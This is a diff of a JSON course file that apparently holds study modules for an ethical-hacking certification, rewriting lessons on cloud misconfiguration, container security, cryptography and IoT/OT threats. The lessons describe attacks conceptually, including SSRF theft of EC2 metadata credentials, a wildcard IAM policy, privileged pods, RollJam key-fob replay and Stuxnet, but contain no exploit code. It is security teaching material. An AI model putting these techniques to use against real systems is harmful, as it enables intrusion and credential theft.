-          "content": "<p>Misconfigurations are a primary cloud threat. An AWS S3 bucket with its ACL set to <strong>public-read</strong> allows anyone on the internet to list and download all objects without authentication, leading to severe data breaches.</p><p>Identity and Access Management (IAM) requires the principle of least privilege. An AWS policy with <code>{\"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\"}</code> grants full administrative access to all resources. If compromised, an attacker has total control over the account.</p><p>Attackers can also exploit SSRF to access the <strong>EC2 instance metadata service</strong> at <code>http://169.254.169.254/latest/meta-data/</code> and steal temporary IAM credentials, which can be used externally. AWS IMDSv2 mitigates this by requiring a PUT request and a session token.</p>",
-          "keyTerms": [
-            "S3 Bucket Misconfiguration",
-            "public-read",
             "IAM Policy",
-            "SSRF",
-            "Metadata Service",
+            "public-read",
             "IMDSv2"
           ]
         },
         {
-          "title": "Container and Serverless Security",
-          "content": "<p><strong>Container Escape</strong> occurs when an attacker breaks out of a container's isolation to access the host system or other containers. Running Docker containers as <strong>root</strong> is extremely dangerous; if an escape occurs, the attacker inherits root access on the host. Containers should run as non-root users.</p><p>In Kubernetes, running pods with <code>hostNetwork: true</code> and <code>privileged: true</code> effectively breaks container isolation, giving the pod direct access to the host's network interfaces and full kernel capabilities.</p><p><strong>Serverless Computing (FaaS)</strong> introduces risks such as over-privileged IAM roles, insecure dependencies, injection attacks via event data, and sensitive data exposure in plaintext environment variables.</p>",
+          "title": "Container Security, Serverless, and Zero Trust",
+          "content": "<p>Running Docker containers as <strong>root</strong> is dangerous; a <strong>container escape</strong> gives the attacker root access on the host. In Kubernetes, running pods with <code>hostNetwork: true</code> and <code>privileged: true</code> completely breaks container isolation, providing direct access to host network interfaces and kernel capabilities.</p><p>Serverless computing (FaaS) introduces risks like over-privileged functions, insecure dependencies, and injection via event data.</p><p>The <strong>Zero Trust</strong> model assumes no entity is inherently trusted, requiring continuous verification regardless of network location. <strong>CSPM (Cloud Security Posture Management)</strong> tools help maintain this by continuously monitoring infrastructure for misconfigurations and compliance violations.</p>",
           "keyTerms": [
             "Container Escape",
-            "Docker Root",
-            "Serverless",
-            "FaaS",
             "hostNetwork",
-            "privileged"
+            "privileged",
+            "Zero Trust",
+            "CSPM"
           ]
         },
         {
-          "title": "Zero Trust and CSPM",
-          "content": "<p>The <strong>Zero Trust security model</strong> assumes no user, device, or network is inherently trusted. It requires continuous verification of identity and authorization for every access request, regardless of whether it originates inside or outside the network perimeter.</p><p>To maintain security in multi-cloud environments, organizations use <strong>CSPM (Cloud Security Posture Management)</strong> tools. CSPM continuously monitors cloud infrastructure configurations, detects misconfigurations, identifies compliance violations, and highlights security risks.</p>",
+          "title": "Cryptography Fundamentals",
+          "content": "<p><strong>Symmetric encryption</strong> uses the same shared key for encryption and decryption (e.g., AES, DES). <strong>Asymmetric encryption</strong> uses a public key for encryption and a private key for decryption, solving the key distribution problem (e.g., RSA, ECC).</p><ul><li><strong>AES:</strong> Advanced Encryption Standard uses a fixed block size of 128 bits.</li><li><strong>DES & 3DES:</strong> DES has an effective key size of 56 bits. 3DES applies the DES cipher three times consecutively with up to three different keys.</li><li><strong>RC4:</strong> A classic software stream cipher that encrypts bit-by-bit.</li><li><strong>RSA:</strong> Security relies on the mathematical difficulty of factoring the product of two large prime numbers.</li><li><strong>ECC (Elliptic Curve Cryptography):</strong> Requires much shorter key lengths than RSA to provide the same level of security.</li><li><strong>Diffie-Hellman:</strong> Protocol for securely exchanging keys over an insecure channel.</li></ul>",
           "keyTerms": [
-            "Zero Trust",
-            "CSPM",
-            "Continuous Verification"
+            "Symmetric Encryption",
+            "Asymmetric Encryption",
+            "AES",
+            "DES",
+            "3DES",
+            "RC4",
+            "RSA",
+            "ECC",
+            "Diffie-Hellman"
+          ]
+        },
+        {
+          "title": "Hashing, PKI, and Advanced Cryptography",
+          "content": "<p>A <strong>cryptographic hash function</strong> (like SHA-256) ensures data integrity by generating a fixed-size digest. <strong>Collision resistance</strong> ensures two different inputs don't produce the same hash. Adding a random <strong>salt</strong> to passwords defends against rainbow tables.</p><p><strong>Digital Signatures</strong> provide Authentication, Integrity, and Non-repudiation. In a <strong>PKI (Public Key Infrastructure)</strong>, the <strong>Certificate Authority (CA)</strong> verifies identities and issues digital certificates. Alternatively, PGP uses a decentralized <strong>Web of Trust</strong>.</p><ul><li><strong>Steganography:</strong> Hiding a secret message within the pixels of an image.</li><li><strong>Homomorphic Encryption:</strong> Allows computations to be performed on ciphertext without decrypting it first.</li><li><strong>Quantum Computing:</strong> Shor's algorithm can rapidly factor integers, threatening RSA and ECC.</li><li><strong>IPsec Tunnel Mode:</strong> Encrypts the entire original IP packet and header for VPNs.</li></ul>",
+          "keyTerms": [
+            "Hash Collision",
+            "Salting",
+            "Digital Signature",
+            "Certificate Authority",
+            "Web of Trust",
+            "Steganography",
+            "Homomorphic Encryption",
+            "Shor's Algorithm",
+            "IPsec Tunnel Mode"
+          ]
+        },
+        {
+          "title": "Cryptanalysis and Vulnerabilities",
+          "content": "<p>Cryptographic attacks attempt to deduce keys or plaintexts:</p><ul><li><strong>Known-plaintext attack:</strong> Attacker possesses samples of both plaintext and ciphertext.</li><li><strong>Ciphertext-only attack:</strong> Attacker only has the encrypted messages.</li><li><strong>Chosen-ciphertext attack:</strong> Attacker can choose ciphertexts and obtain their decrypted plaintexts.</li><li><strong>Meet-in-the-middle attack:</strong> Exploits intermediate states, making Double DES (2DES) no more secure than single DES.</li><li><strong>Birthday attack:</strong> A statistical attack aimed at finding hash collisions.</li><li><strong>Protocol Vulnerabilities:</strong> <strong>POODLE</strong> exploited fallback mechanisms to force vulnerable SSL 3.0. <strong>Heartbleed</strong> was a flaw in OpenSSL allowing memory reads. <strong>TLS</strong> is the modern, secure successor to the deprecated SSL protocol.</li></ul>",
+          "keyTerms": [
+            "Known-plaintext",
+            "Ciphertext-only",
+            "Chosen-ciphertext",
+            "Meet-in-the-middle",
+            "Birthday Attack",
+            "POODLE",
+            "Heartbleed",
+            "TLS"
           ]
         }
       ],
       "tools": [
         "ScoutSuite",
-        "Prowler",
-        "CloudSploit",
-        "Pacu",
+        "OpenSSL",
         "Trivy",
-        "Falco",
-        "kube-bench",
-        "CloudMapper"
+        "Hashcat"
       ],
       "v13Updates": [
-        "Zero Trust architecture deep dive",
-        "AI in cloud security operations (AIOps)",
-        "Cloud-native application protection platforms (CNAPP)"
+        "Zero Trust principles",
+        "Shor's Algorithm Implications"
       ]
     },
     {
       "id": 20,
-      "title": "Cryptography",
+      "title": "Advanced Cryptography and OT Deep Dive",
       "domainId": 9,
       "icon": "key",
-      "description": "Comprehensive coverage of cryptographic concepts including symmetric and asymmetric encryption, hashing, PKI, digital certificates, blockchain, and the emerging field of post-quantum cryptography.",
+      "description": "Integrates advanced IoT/OT operational mechanics, the Purdue model, and critical cryptographic vulnerabilities in physical devices and networks.",
       "objectives": [
-        "Understand symmetric and asymmetric encryption algorithms",
-        "Explain hashing algorithms and their security properties",
-        "Describe PKI components and digital certificate management",
-        "Identify cryptanalysis techniques and their applications",
-        "Explain post-quantum cryptography and blockchain concepts"
+        "Understand the IoT edge layer and specialized protocols",
+        "Analyze high-impact OT/ICS threats and malware",
+        "Assess physical wireless threats to IoT devices",
+        "Perform firmware extraction and analysis"
       ],
       "topics": [
         {
-          "title": "Encryption Types and Vulnerabilities",
-          "content": "<p><strong>Symmetric encryption</strong> uses a single shared key for both encryption and decryption (e.g., AES, DES). <strong>Asymmetric encryption</strong> uses a mathematically related key pair — a public key for encryption and a private key for decryption (e.g., RSA, ECC).</p><p>In symmetric encryption modes like AES-256-CBC, reusing the same key and <strong>Initialization Vector (IV)</strong> for different messages causes identical plaintext blocks to produce identical ciphertext blocks, leaking information about the plaintext structure and enabling pattern analysis.</p><p>For full disk encryption (e.g., AES-256-XTS), if a device is in sleep mode, the encryption keys remain in RAM. This makes it vulnerable to a <strong>Cold Boot attack</strong>, where an attacker cools the RAM and dumps its contents to extract the keys.</p>",
+          "title": "IoT Architecture and the Edge Layer",
+          "content": "<p>In the standard IoT architecture, the <strong>Edge (Device) layer</strong> consists of the physical sensors, actuators, and smart devices that interact directly with the environment. These devices often utilize lightweight protocols like <strong>MQTT</strong>, a publish-subscribe messaging protocol designed for high-latency or unreliable networks.</p><p>Tools like <strong>Shodan</strong> operate as search engines designed to locate exposed internet-connected devices, making it trivial for attackers to find vulnerable IoT infrastructure.</p>",
           "keyTerms": [
-            "Symmetric Encryption",
-            "Asymmetric Encryption",
-            "AES-CBC",
-            "IV Reuse",
-            "Cold Boot Attack"
+            "Edge Layer",
+            "MQTT",
+            "Shodan",
+            "Actuators"
           ]
         },
         {
-          "title": "Hashing, Salting, and Digital Signatures",
-          "content": "<p>A <strong>cryptographic hash function</strong> (like SHA-256) generates a fixed-size digest from any input. <strong>Collision resistance</strong> is the property that ensures it is computationally infeasible to find two different inputs that produce the same hash.</p><p>Attackers use precomputed rainbow tables to reverse password hashes. This is defeated by <strong>Salting</strong>—adding a unique random value to each password before hashing, which ensures identical passwords produce different hashes.</p><p>A <strong>Digital Signature</strong> provides integrity, authentication, and non-repudiation. The sender hashes the message and encrypts the hash with their private key. The recipient decrypts it with the sender's public key and verifies the hash against the message.</p>",
+          "title": "Advanced IoT and Wireless Threats",
+          "content": "<p>IoT ecosystems face unique threats:</p><ul><li><strong>Mirai Botnet:</strong> Propagated primarily by exploiting weak or factory default usernames and passwords on embedded devices.</li><li><strong>RollJam Attack:</strong> A physical wireless attack against car key fobs. It jams the vehicle's receiver while simultaneously recording the rolling code sent by the fob, saving it for later unauthorized use.</li><li><strong>Sybil Attack:</strong> A single malicious node spoofs multiple fake identities to gain disproportionate influence over the network, subverting routing protocols or reputation systems in P2P/IoT networks.</li><li><strong>Zigbee Replay:</strong> Short-range home automation protocols like Zigbee are vulnerable to replay attacks if frame counters are not implemented correctly.</li></ul>",
           "keyTerms": [
-            "Hash Function",
-            "Collision Resistance",
-            "Salting",
-            "Rainbow Tables",
-            "Digital Signature"
+            "Mirai",
+            "RollJam Attack",
+            "Sybil Attack",
+            "Zigbee Replay"
           ]
         },
         {
-          "title": "PKI and Blockchain",
-          "content": "<p><strong>Public Key Infrastructure (PKI)</strong> manages digital certificates and public-key encryption. The <strong>Certificate Authority (CA)</strong> is the trusted entity that issues, validates, and revokes digital certificates.</p><p><strong>Blockchain</strong> ensures data integrity and immutability. Each block contains a cryptographic hash of the previous block, creating a chain where altering any data changes its hash, thus invalidating all subsequent blocks.</p>",
+          "title": "OT/ICS Systems and Cyber-Physical Threats",
+          "content": "<p><strong>SCADA</strong> systems monitor and control large-scale industrial processes. At the heart of these systems is the <strong>PLC (Programmable Logic Controller)</strong>, a ruggedized industrial computer that directly reads sensors and operates physical machinery (valves, motors). Operators monitor these processes via a graphical dashboard called the <strong>HMI (Human-Machine Interface)</strong>.</p><p>In Operational Technology (OT), <strong>Availability</strong> is the most prioritized security principle, as downtime can lead to catastrophic physical or financial consequences. The lack of security in legacy protocols like Modbus leaves these systems highly vulnerable.</p><p>A prime example of a cyber-physical attack is the <strong>Stuxnet</strong> worm, which was specifically designed to sabotage Iranian nuclear centrifuges by altering Siemens PLC logic.</p>",
           "keyTerms": [
-            "PKI",
-            "Certificate Authority",
-            "Blockchain",
-            "Cryptographic Chaining"
+            "SCADA",
+            "PLC",
+            "HMI",
+            "OT Availability",
+            "Stuxnet",
+            "Modbus"
           ]
         },
         {
-          "title": "Quantum Computing and Post-Quantum Cryptography",
-          "content": "<p><strong>Quantum computing</strong> (via Shor's algorithm) threatens asymmetric encryption by efficiently factoring large numbers and solving discrete logarithms, effectively breaking RSA, ECC, and Diffie-Hellman.</p><p>To counter this, NIST has standardized post-quantum algorithms: <strong>CRYSTALS-Kyber (ML-KEM)</strong> for key encapsulation (key exchange) and <strong>CRYSTALS-Dilithium (ML-DSA)</strong> for digital signatures. Both rely on lattice-based cryptography, which is believed to be quantum-resistant.</p>",
+          "title": "ICS Network Architecture and Firmware Analysis",
+          "content": "<p>To protect vulnerable OT components from internet and IT-based threats, organizations implement the <strong>Purdue Model</strong> (Purdue Enterprise Reference Architecture). This framework divides ICS and enterprise networks into distinct hierarchical zones, enforcing strict network segmentation.</p><p>Security researchers investigating IoT/OT devices often need to analyze their embedded software. <strong>Binwalk</strong> is the industry-standard tool used for analyzing, reverse engineering, and extracting compressed file systems from binary firmware images.</p>",
           "keyTerms": [
-            "Quantum Computing",
-            "Shor's Algorithm",
-            "CRYSTALS-Kyber",
-            "ML-KEM",
-            "CRYSTALS-Dilithium",
-            "ML-DSA",
-            "Lattice Cryptography"
+            "Purdue Model",
+            "Network Segmentation",
+            "Binwalk",
+            "Firmware Analysis"
           ]
         }
       ],
       "tools": [
-        "OpenSSL",
-        "GPG/PGP",
-        "Hashcat",
-        "CrypTool",
-        "VeraCrypt",
-        "BitLocker",
-        "Let's Encrypt"
+        "Shodan",
+        "Binwalk",
+        "Wireshark"
       ],
       "v13Updates": [
-        "Post-quantum cryptography (ML-KEM/ML-DSA)",
-        "AI-driven cryptanalysis",
-        "Quantum-safe migration planning"
+        "OT Security Frameworks",
+        "IoT Protocol Exploitation"
       ]
     }
   ]
